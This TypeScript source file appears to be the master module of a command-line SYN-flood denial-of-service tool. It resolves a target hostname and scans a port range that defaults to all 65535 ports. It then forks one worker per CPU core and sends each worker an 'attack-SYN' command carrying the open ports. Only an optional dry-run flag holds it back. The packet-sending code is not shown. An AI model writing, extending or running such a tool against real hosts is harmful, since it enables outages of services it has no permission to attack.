import * as os from 'os';
import * as cluster from 'cluster';
import * as yargs from 'yargs';
import { resolveIPAddresses, checkPorts } from './helpers';
import { Address } from './types';

const getArgs = () => yargs
  .demandCommand(1)
  .boolean('d')
  .alias('d', 'dry-run')
  .describe('d', 'dry run: do not actually perform the attack')
  .string('p')
  .alias('p', 'ports')
  .describe('p', 'a range of ports to attack. e.g. 8000-8200')
  .default('p', '1-65535')
  .coerce('p', ports => {
    const matches = ports.match(/^([0-9]{0,5})-([0-9]{0,5})$/);
    if (!matches) {
      throw new Error('Invalid port range')
    }

    const lower = parseInt(matches[1], 10);
    const upper = parseInt(matches[2], 10);

    if (lower > 65535 || upper > 65535 || upper < lower) {
      throw new Error('Invalid port range');
    }

    return { lower, upper };
  })
  .argv;

async function master() {
  const args = getArgs();
  const hostname: string = args._[0];

  console.log(`Resolving '${hostname}'`);

  const ipAddresses: Address[] = await resolveIPAddresses(hostname);
  if (!ipAddresses.length) {
    throw new Error(`Could not resolve ${hostname}`);
  }

  console.log('Found the following ip addresses:\n', ipAddresses.map(address => address.ip));

  const ipPorts = await checkPorts(ipAddresses, args.ports.lower, args.ports.upper);

  // For each CPU, fork the cluster.
  for (let i = 0; i < os.cpus().length; i++) {
    const worker = cluster.fork();

    worker.on('online', () => {
      worker.send({type: 'attack-SYN', data: ipPorts});
    });
  }

  // Intercept exit for cleanup.
  process.on('SIGINT', () => {
    console.log('Shutting down gracefully');

    for (const id in cluster.workers) {
      cluster.workers[id].send({type: 'kill'});
    }

    // Wait until all clusters have been cleared from memory, then exit the process.
    setInterval(() => {
      if (!Object.keys(cluster.workers).length) {
        console.log('All clusters are exited');

        process.exit();
      }
    }, 500);
  });
}

export default master;